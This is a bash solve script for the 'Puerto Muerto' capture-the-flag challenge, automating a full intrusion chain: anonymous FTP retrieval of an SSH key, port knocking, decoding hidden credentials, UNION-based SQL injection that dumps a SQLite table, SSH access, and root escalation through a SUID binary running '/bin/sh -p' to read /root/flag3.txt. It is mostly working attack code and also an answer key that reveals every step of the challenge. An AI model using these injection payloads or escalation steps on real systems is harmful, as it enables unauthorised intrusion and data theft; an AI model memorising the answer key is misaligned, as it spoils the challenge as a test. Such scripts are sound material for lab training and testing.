#!/usr/bin/env bash

# Automated solve script for the Puerto Muerto CTF challenge.
# Replicates the full exploit chain without using any privileged information.
# Every step performs the same discovery process a participant would follow.
#
# Usage:   bash solve.sh <IP> <FTP_PORT> <PORTAL_PORT> <SSH_PORT> <HTTP_PORT>
# Example: bash solve.sh 10.128.10.30 2121 3000 2222 8090
#
# Requirements: ftp, knock, curl, ssh, ssh-keygen, sha256sum

set -euo pipefail

# ---------------------------------------------------------------------------
# Argument validation
# ---------------------------------------------------------------------------

if [[ $# -lt 5 ]]; then
    echo "[ERROR] Usage: bash solve.sh <IP> <FTP_PORT> <PORTAL_PORT> <SSH_PORT> <HTTP_PORT>"
    exit 1
fi

TARGET_IP="$1"
FTP_PORT="$2"
PORTAL_PORT="$3"
SSH_PORT="$4"
HTTP_PORT="$5"

WORKDIR=$(mktemp -d /tmp/puerto-muerto-solve.XXXXXX)
trap 'rm -rf "${WORKDIR}"' EXIT

# ---------------------------------------------------------------------------
# Helper: reknock
# Resends the knock sequence immediately before each SSH call to guarantee
# the iptables ACCEPT rule is active. The knockd cmd_timeout is 300 seconds
# but long phases can still expire it between calls.
# ---------------------------------------------------------------------------

reknock() {
    # Word-split is intentional — KNOCK_SEQ contains space-separated integers
    # shellcheck disable=SC2086
    knock "${TARGET_IP}" ${KNOCK_SEQ}
    sleep 2
}

# ---------------------------------------------------------------------------
# Helper: submit_flag
# Fetches a CSRF token from the portal before each submission and includes
# it in the POST request. The token is extracted from the portal's index
# page and passed as a header alongside the session cookie.
# ---------------------------------------------------------------------------
submit_flag() {
    local flag_id="$1"
    local flag_value="$2"
    local response correct

    response=$(curl -s \
        -b "${PORTAL_COOKIE_JAR}" \
        -c "${PORTAL_COOKIE_JAR}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "X-CSRF-Token: ${PORTAL_CSRF}" \
        -d "{\"flag_id\": ${flag_id}, \"value\": \"${flag_value}\"}" \
        "http://${TARGET_IP}:${PORTAL_PORT}/submit")

    correct=$(echo "${response}" | grep -oP '"correct":\s*\K(true|false)' || echo "unknown")
    echo "[*] Flag ${flag_id} submission: correct=${correct}"

    # Expose the raw response to the outer scope so Phase 10 can extract
    # the master flag from the final submission response without an extra request.
    FLAG3_RESPONSE="${response}"
}



echo "============================================================"
echo "  PUERTO MUERTO — Automated Solve Script"
echo "============================================================"
echo "[*] Target IP:    ${TARGET_IP}"
echo "[*] FTP port:     ${FTP_PORT}"
echo "[*] SSH port:     ${SSH_PORT}"
echo "[*] Portal port:  ${PORTAL_PORT}"
echo "[*] Working dir:  ${WORKDIR}"
echo "============================================================"

# ---------------------------------------------------------------------------
# Phase 1 — Anonymous FTP: download README.txt, maintenance.key and
#           inspector_registry.txt
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 1] Connecting to FTP anonymously on port ${FTP_PORT}..."

ftp -n -p "${TARGET_IP}" "${FTP_PORT}" <<EOF
user anonymous anonymous
binary
get README.txt ${WORKDIR}/README.txt
get inspector_registry.txt ${WORKDIR}/inspector_registry.txt
cd private
get maintenance.key ${WORKDIR}/maintenance.key
quit
EOF

[[ -f "${WORKDIR}/README.txt" ]]              || { echo "[ERROR] README.txt not downloaded";              exit 1; }
[[ -f "${WORKDIR}/inspector_registry.txt" ]]  || { echo "[ERROR] inspector_registry.txt not downloaded";  exit 1; }
[[ -f "${WORKDIR}/maintenance.key" ]]         || { echo "[ERROR] maintenance.key not downloaded";         exit 1; }

echo "[+] Downloaded README.txt"
echo "[+] Downloaded inspector_registry.txt"
echo "[+] Downloaded maintenance.key"
echo ""
echo "[*] README.txt contents:"
cat "${WORKDIR}/README.txt"


# ---------------------------------------------------------------------------
# Phase 2 — Parse knock sequence from README.txt
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 2] Parsing port knock sequence..."

# Extract activation codes from "Modulo A/B/C: NNNN" lines, preserving A->B->C order.
KNOCK_SEQ=$(grep -oP 'Modulo [ABC]:\s*\K[0-9]+' "${WORKDIR}/README.txt" | tr '\n' ' ')

[[ -n "${KNOCK_SEQ}" ]] || { echo "[ERROR] Could not parse knock sequence from README.txt"; exit 1; }
echo "[+] Knock sequence parsed: ${KNOCK_SEQ}"

# ---------------------------------------------------------------------------
# Phase 3 — Port knocking: unlock HTTP (8090) and SSH (2222)
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 3] Sending port knock sequence..."

# Word-split is intentional here
# shellcheck disable=SC2086
knock "${TARGET_IP}" ${KNOCK_SEQ}
sleep 2

echo "[+] Knock sequence sent."

# ---------------------------------------------------------------------------
# Phase 4 — SIGEPORT SQLi: decode credentials, authenticate, extract Flag 1
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 4] Decoding SIGEPORT credentials from inspector_registry.txt..."

# Extract the base64 payload from the registry file — the single line that
# contains only base64 characters and no spaces or punctuation from the
# narrative text surrounding it.
ENCODED_PAYLOAD=$(grep -oP '^[A-Za-z0-9+/]+=*$' "${WORKDIR}/inspector_registry.txt")

[[ -n "${ENCODED_PAYLOAD}" ]] || { echo "[ERROR] Could not extract encoded payload from inspector_registry.txt"; exit 1; }

# Step 1: base64 decode → produces a hex string (no spaces).
# Step 2: hex decode → produces the plaintext credentials.
DECODED=$(echo "${ENCODED_PAYLOAD}" | base64 -d | xxd -r -p)

[[ -n "${DECODED}" ]] || { echo "[ERROR] Could not decode credentials"; exit 1; }
echo "[*] Decoded registry entry: ${DECODED}"

# Strip surrounding quotes and split on ':' to recover inspector_id and access_code.
CLEANED=$(echo "${DECODED}" | tr -d '"')
SIGEPORT_USER=$(echo "${CLEANED}" | cut -d':' -f1)
SIGEPORT_PASS=$(echo "${CLEANED}" | cut -d':' -f2)

[[ -n "${SIGEPORT_USER}" ]] || { echo "[ERROR] Could not parse inspector_id from decoded payload"; exit 1; }
[[ -n "${SIGEPORT_PASS}" ]] || { echo "[ERROR] Could not parse access_code from decoded payload"; exit 1; }

echo "[+] Inspector ID: ${SIGEPORT_USER}"
echo "[+] Access Code:  ${SIGEPORT_PASS}"

# ---------------------------------------------------------------------------
# Phase 4b — Authenticate to SIGEPORT and obtain a session cookie
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 4b] Authenticating to SIGEPORT portal..."

COOKIE_JAR="${WORKDIR}/sigeport_session.txt"

LOGIN_RESPONSE=$(curl -s -c "${COOKIE_JAR}" \
    -X POST \
    -d "inspector_id=${SIGEPORT_USER}&access_code=${SIGEPORT_PASS}" \
    "http://${TARGET_IP}:${HTTP_PORT}/")

# A successful login redirects to /panel. Verify the session cookie was set.
SESSION_COOKIE=$(grep -oP 'session\s+\K\S+' "${COOKIE_JAR}" || true)

[[ -n "${SESSION_COOKIE}" ]] || { echo "[ERROR] Login failed — no session cookie received"; exit 1; }
echo "[+] Session established."

# ---------------------------------------------------------------------------
# Phase 4c — Enumerate database schema via UNION injection on vessel search
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 4c] Enumerating database schema via SQLi on vessel search..."

# Confirm the column count is 4 and enumerate all table names from sqlite_master.
# The UNION injects into: SELECT vessel_name, origin, destination, status FROM manifests
# sqlite_master columns used: name (table name), sql (DDL), NULL, NULL.
SCHEMA_RESPONSE=$(curl -s -b "${COOKIE_JAR}" \
    -G \
    --data-urlencode "vessel=' UNION SELECT name,sql,NULL,NULL FROM sqlite_master WHERE type='table'--" \
    "http://${TARGET_IP}:${HTTP_PORT}/panel")

# Extract table names from the first column of the rendered table rows.
TABLES=$(echo "${SCHEMA_RESPONSE}" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | head -n 10)

echo "[*] Tables discovered:"
echo "${TABLES}"

echo "${TABLES}" | grep -q "classified_cargo" || {
    echo "[ERROR] classified_cargo table not found in schema enumeration"
    exit 1
}
echo "[+] Target table 'classified_cargo' confirmed."

# ---------------------------------------------------------------------------
# Phase 4d — Dump classified_cargo table to extract Flag 1
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 4d] Extracting Flag 1 from classified_cargo..."

# The classified_cargo table has columns: id, manifest_ref, cargo_type, clearance.
# clearance holds the flag value. Mapped to the 4-column UNION:
#   vessel_name  <- manifest_ref
#   origin       <- cargo_type
#   destination  <- clearance  (flag lives here)
#   status       <- NULL
DUMP_RESPONSE=$(curl -s -b "${COOKIE_JAR}" \
    -G \
    --data-urlencode "vessel=' UNION SELECT manifest_ref,cargo_type,clearance,NULL FROM classified_cargo--" \
    "http://${TARGET_IP}:${HTTP_PORT}/panel")

FLAG1=$(echo "${DUMP_RESPONSE}" | grep -oP 'G3CUBO\{[^}]+\}')

[[ -n "${FLAG1}" ]] || { echo "[ERROR] Could not extract Flag 1 from classified_cargo"; exit 1; }
echo "[+] FLAG 1 recovered: ${FLAG1}"


# ---------------------------------------------------------------------------
# Phase 5 — Derive SSH passphrase from FTP MDTM timestamp
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 5] Deriving SSH key passphrase from FTP MDTM timestamp..."

# The ftp -v flag causes the client to print all server responses to stderr.
# Redirecting 2>&1 merges stderr into stdout so grep can match the 213 line.
MDTM_RESPONSE=$(ftp -n -v -p "${TARGET_IP}" "${FTP_PORT}" 2>&1 <<EOF | grep -oP '213 \K[0-9]{14}'
user anonymous anonymous
quote MDTM README.txt
quit
EOF
)

[[ -n "${MDTM_RESPONSE}" ]] || { echo "[ERROR] Could not retrieve MDTM timestamp from FTP"; exit 1; }
echo "[*] MDTM timestamp: ${MDTM_RESPONSE}"

# The passphrase is the SHA256 hex digest of the raw 14-character timestamp string.
# echo -n is mandatory — a trailing newline produces a completely different hash.
PASSPHRASE=$(echo -n "${MDTM_RESPONSE}" | sha256sum | awk '{print $1}')
echo "[*] Derived SSH passphrase: ${PASSPHRASE}"


# ---------------------------------------------------------------------------
# Phase 6 — Decrypt SSH key and verify connectivity as porter
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 6] Preparing SSH key and logging in as porter..."

chmod 600 "${WORKDIR}/maintenance.key"
cp "${WORKDIR}/maintenance.key" "${WORKDIR}/maintenance_plain.key"
chmod 600 "${WORKDIR}/maintenance_plain.key"

# Remove the passphrase from the key copy so BatchMode SSH never needs to prompt.
# Modern OpenSSH drops encrypted keys silently in BatchMode on non-interactive exec.
ssh-keygen -q -p \
    -P "${PASSPHRASE}" \
    -N "" \
    -f "${WORKDIR}/maintenance_plain.key" >/dev/null 2>&1 || {
    echo "[ERROR] Failed to decrypt SSH key — passphrase may be incorrect: ${PASSPHRASE}"
    exit 1
}

echo "[+] SSH key decrypted successfully."

SSH_OPTS=(
    -i "${WORKDIR}/maintenance_plain.key"
    -o StrictHostKeyChecking=no
    -o UserKnownHostsFile=/dev/null
    -o BatchMode=yes
    -o ConnectTimeout=10
    -o IdentitiesOnly=yes
    -o ServerAliveInterval=15
    -o ServerAliveCountMax=3
    -p "${SSH_PORT}"
)

reknock
ssh "${SSH_OPTS[@]}" "porter@${TARGET_IP}" 'exit 0' 2>/dev/null || {
    echo "[ERROR] SSH connectivity check failed on port ${SSH_PORT}"
    exit 1
}
echo "[+] SSH connectivity confirmed."


# ---------------------------------------------------------------------------
# Phase 7 — Derive Flag 2 decryption key, retrieve encrypted blob, decrypt
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 7] Retrieving and decrypting Flag 2 as porter..."

# Query the FTP server for the exact byte size of README.txt using the SIZE
# command — a different metadata query than the MDTM command used in Phase 5.
# Both commands return a 213 response code, so the same grep pattern applies.
README_SIZE=$(ftp -n -v -p "${TARGET_IP}" "${FTP_PORT}" 2>&1 <<EOF | grep -oP '213 \K[0-9]+'
user anonymous anonymous
quote SIZE README.txt
quit
EOF
)

[[ -n "${README_SIZE}" ]] || { echo "[ERROR] Could not retrieve README.txt byte size from FTP"; exit 1; }
echo "[*] README.txt byte size: ${README_SIZE}"

# The decryption key is the SHA256 hex digest of the decimal byte size string.
# echo -n is mandatory — a trailing newline produces a completely different hash.
FLAG2_KEY=$(echo -n "${README_SIZE}" | sha256sum | awk '{print $1}')
echo "[*] Derived decryption key: ${FLAG2_KEY}"

# Pull the encrypted flag file over SCP using the passphrase-stripped key.
# maintenance_plain.key requires no passphrase prompt, keeping the call fully
# non-interactive with BatchMode=yes enforced in SSH_OPTS.
reknock
reknock
scp -i "${WORKDIR}/maintenance_plain.key" \
    -P "${SSH_PORT}" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o BatchMode=yes \
    -o ConnectTimeout=10 \
    -o IdentitiesOnly=yes \
    "porter@${TARGET_IP}:~/flag2.enc" \
    "${WORKDIR}/flag2.enc" 2>/dev/null


[[ -f "${WORKDIR}/flag2.enc" ]] || { echo "[ERROR] Could not retrieve flag2.enc via SCP"; exit 1; }

# Decrypt the flag locally. The container encrypted it with AES-256-CBC and
# PBKDF2 key stretching — both parameters must match the execute.sh encryption
# call exactly or openssl will produce no output and exit non-zero.
FLAG2=$(openssl enc -aes-256-cbc -d -pbkdf2 \
    -in "${WORKDIR}/flag2.enc" \
    -pass pass:"${FLAG2_KEY}" 2>/dev/null)

[[ -n "${FLAG2}" ]] || { echo "[ERROR] Decryption failed — key mismatch or corrupted file"; exit 1; }

echo "${FLAG2}" > "${WORKDIR}/flag2.txt"
echo "[+] FLAG 2 recovered: ${FLAG2}"


# ---------------------------------------------------------------------------
# Phase 8 — Privilege escalation via SUID python3 (GTFOBins)
# ---------------------------------------------------------------------------


echo ""
echo "[Phase 8] Escalating to root via SUID python3 binary..."


reknock
FLAG3=$(ssh "${SSH_OPTS[@]}" "porter@${TARGET_IP}" \
    '/usr/local/bin/port-env /bin/sh -p -c "cat /root/flag3.txt"' 2>/dev/null)


[[ -n "${FLAG3}" ]] || { echo "[ERROR] Could not retrieve Flag 3 via SUID python3."; exit 1; }
echo "[+] FLAG 3 recovered: ${FLAG3}"


# ---------------------------------------------------------------------------
# Phase 9 — Submit all flags to the portal
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 9] Submitting flags to the CTF portal..."

# Establish a single portal session and extract the CSRF token once.
# Reusing the same cookie jar and token across all three submissions
# prevents session state from being wiped between calls and avoids
# triggering the rate limiter with repeated GET requests.
echo "[*] Establishing portal session..."
PORTAL_COOKIE_JAR="${WORKDIR}/portal_session.txt"
PORTAL_CSRF=$(curl -s -c "${PORTAL_COOKIE_JAR}" \
    "http://${TARGET_IP}:${PORTAL_PORT}/" \
    | grep -oP '(?<=<meta name="csrf-token" content=")[^"]+')

[[ -n "${PORTAL_CSRF}" ]] || { echo "[ERROR] Could not retrieve CSRF token from portal"; exit 1; }
echo "[+] Portal session established. CSRF token acquired."

submit_flag 1 "${FLAG1}"
submit_flag 2 "${FLAG2}"
submit_flag 3 "${FLAG3}"


# ---------------------------------------------------------------------------
# Phase 10 — Retrieve master flag from portal
# ---------------------------------------------------------------------------

echo ""
echo "[Phase 10] Retrieving master flag from portal..."

# The master flag is delivered directly in the Flag 3 submission response
# when show_master becomes true. Extracting it from that response avoids
# a separate /status call which would require the same session cookie and
# still not return the master flag value anyway.
MASTER_FLAG=$(echo "${FLAG3_RESPONSE}" | grep -oP '"master_flag":"?\K[^",]+')

[[ -n "${MASTER_FLAG}" ]] || { echo "[ERROR] Master flag not present in Flag 3 response."; exit 1; }
echo "[+] MASTER FLAG recovered: ${MASTER_FLAG}"


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

echo ""
echo "============================================================"
echo " SOLVE COMPLETE"
echo "============================================================"
echo " Flag 1:      ${FLAG1}"
echo " Flag 2:      ${FLAG2}"
echo " Flag 3:      ${FLAG3}"
echo " Master Flag: ${MASTER_FLAG}"
echo "============================================================"